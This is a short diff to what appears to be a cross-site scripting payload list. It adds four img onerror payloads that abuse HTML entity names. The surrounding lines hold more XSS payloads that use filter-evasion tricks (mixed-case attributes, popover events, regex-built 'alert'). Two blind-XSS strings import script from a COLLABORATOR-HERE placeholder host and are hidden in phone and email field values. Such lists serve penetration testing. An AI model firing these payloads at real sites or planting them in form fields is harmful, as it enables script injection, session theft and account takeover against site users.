@@ -1,5 +1,9 @@
 013371337;ext=<img/src/onerror=import('//COLLABORATOR-HERE/')>
 "><img/src/onerror=import('//COLLABORATOR-HERE/')>"@wearehackerone.com
+<img src=data: onerror="&dscy;=alert;&dscy;('&#38;dscy;')">
+<img src=data: onerror="&pfr;=alert;&pfr;('&#38;pfr;')">
+<img src=data: onerror="&ycirc;=alert;&ycirc;('&#38;ycirc;')">
+<img src=data: onerror="$[data1]=log;$[data1]('html($[data1])')">
 <button%20popovertarget=x>Click%20me</button><img%20onbeforetoggle=alert(1)%20popover%20id=x>XSS
 <img%20hrEF="x"%20sRC="data:x,"%20oNLy=1%20oNErrOR=prompt`1`>
 <svg/onload=parent[/al/.source+/ert/.source](1)>
